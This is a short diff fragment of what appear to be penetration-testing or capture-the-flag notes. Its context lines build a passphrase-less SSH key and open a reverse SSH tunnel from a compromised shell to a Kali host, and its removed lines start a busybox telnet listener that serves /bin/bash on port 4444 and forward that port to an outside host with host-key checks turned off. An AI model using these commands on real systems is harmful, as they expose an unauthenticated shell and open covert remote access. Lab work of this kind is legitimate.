@@ -278,10 +278,3 @@ tomcat-users.xml
 	ssh-keygen -P "" -f key
 	bash-4.2$ ssh -N -f -R 8080:127.0.0.1:8080 kali@192.168.56.1 -i key
 
-
-./busybox telnetd -l /bin/bash -p 4444
-
-ssh kali@10.0.1.1 -R 4444:127.0.0.1:4444 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no
-
-
-
